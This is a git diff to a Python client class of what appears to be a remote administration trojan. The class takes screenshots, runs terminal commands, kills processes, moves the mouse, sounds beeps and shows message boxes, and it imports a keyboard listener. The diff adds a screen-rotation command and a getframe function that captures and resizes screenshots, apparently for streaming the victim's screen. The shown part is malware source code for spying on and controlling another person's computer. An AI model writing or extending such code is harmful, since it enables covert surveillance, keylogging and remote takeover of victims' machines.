@@ -3,11 +3,14 @@ from time import sleep
 import requests
 import platform
 import socket
-import pyautogui
 import os
 import subprocess
 import psutil
 import win32api
+import rotatescreen
+import pyautogui
+import cv2
+import numpy as np
 from pynput.keyboard import Key, Listener
 from getpass import getuser
 from util import Console
@@ -53,7 +56,7 @@ class ClientCommands:
 
     def screenShot(self):
         pyautogui.screenshot().save(f"{test_konumu}ss.png")
-    
+
     def terminalCommands(self,c:str):
         try:
             if c.startswith("kill"):
@@ -90,9 +93,11 @@ class ClientCommands:
 
     def winManupilation(self,cmd:str):
         try:
-            HELPER = f"""\t{Console.CYAN}╰──/{Console.YELLOW}m.pos x=arg1 y=arg2{Console.CYAN:<16} [{Console.GREEN}Set Mouse Position{Console.CYAN}]
-            \t{Console.CYAN}╰──/{Console.YELLOW}beep hz=arg1 ms=arg2 loop=bool{Console.CYAN:<} [{Console.GREEN}Beep Sound{Console.CYAN}]
-            \t{Console.CYAN}╰──/{Console.YELLOW}alert msg=(arg1) title=arg2 loop=bool{Console.CYAN:<} [{Console.GREEN}Open Message Box{Console.CYAN}]""".expandtabs(14)
+            HELPER = f"""\t{Console.CYAN}╰──/{Console.YELLOW}m.pos x=arg1 y=arg2{Console.CYAN:<23} [{Console.GREEN}Set Mouse Position{Console.CYAN}]
+            \t{Console.CYAN}╰──/{Console.YELLOW}beep hz=arg1 ms=arg2 loop=bool{Console.CYAN:<12} [{Console.GREEN}Beep Sound{Console.CYAN}]
+            \t{Console.CYAN}╰──/{Console.YELLOW}alert msg=(arg1) title=arg2 loop=bool{Console.CYAN:<} [{Console.GREEN}Open Message Box{Console.CYAN}]
+            \t{Console.CYAN}╰──/{Console.YELLOW}rotate-screen deg=int:[0,90,180,270]{Console.CYAN:<6} [{Console.GREEN}Rotate Screen{Console.CYAN}]""".expandtabs(14)
+            
             if cmd == "help":
                 return HELPER
             elif cmd.startswith("m.pos "):
@@ -104,6 +109,7 @@ class ClientCommands:
                     return f"x={x}, y={y}"
                 else:
                     return "Uups! Syntax"
+
             elif cmd.startswith("beep "):
                 beeper = cmd.split()
                 if len(beeper) == 4:
@@ -137,13 +143,28 @@ class ClientCommands:
                         sys.stdout.write("\a")
                         win32api.MessageBox(0,self.alertMSG(cmd),alert[1].replace("title=",""),0x00000010)
                         sys.stdout.flush()
+
+            elif cmd.startswith("rotate-screen"):
+                rotate = cmd.split()
+                deg = int(rotate[1].replace("deg=",""))
+                if len(rotate) == 2:
+                    screen = rotatescreen.get_primary_display()
+                    (lambda: screen.rotate_to([deg for i in [0,90,180,270] if deg == i][0]))()
+                    return f"Rotated {deg} degrees"
             else:
                 return "Unknown command"
 
         except Exception:
             return " "
-    
-    def alertMSG(self,cmd:str) -> tuple:
+
+    def getframe(self):
+        screen = pyautogui.screenshot()
+        frame = np.array(screen)
+        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+        frame = cv2.resize(frame, (1024, 576), interpolation=cv2.INTER_AREA)
+        return frame
+
+    def alertMSG(self,cmd:str) -> str:
         msg = ""
         count = 0
         splitter = cmd.split("alert")
@@ -153,5 +174,4 @@ class ClientCommands:
                 iter_ = splitter[1].replace("msg=(","").strip()
                 msg += iter_[count]
                 count += 1
-        print(msg)
         return msg
